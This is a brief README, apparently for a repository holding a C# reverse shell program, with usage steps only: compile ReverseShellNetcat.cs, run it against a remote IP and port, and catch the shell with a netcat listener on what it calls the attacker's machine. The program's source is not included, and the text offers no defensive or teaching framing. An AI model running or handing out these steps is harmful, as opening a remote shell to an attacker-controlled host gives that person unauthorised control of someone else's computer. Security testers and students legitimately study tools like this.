# ReverseShell_C-
To execute the reverse shell in terminal run this command 

csc ReverseShellNetcat.cs
ReverseShellNetcat.exe <remote_ip> <remote_port>

To open a listener and get the shell simply run this command in the attackers machine
nc -nvlp <local Port>
or 
nc -l -p <local Port>
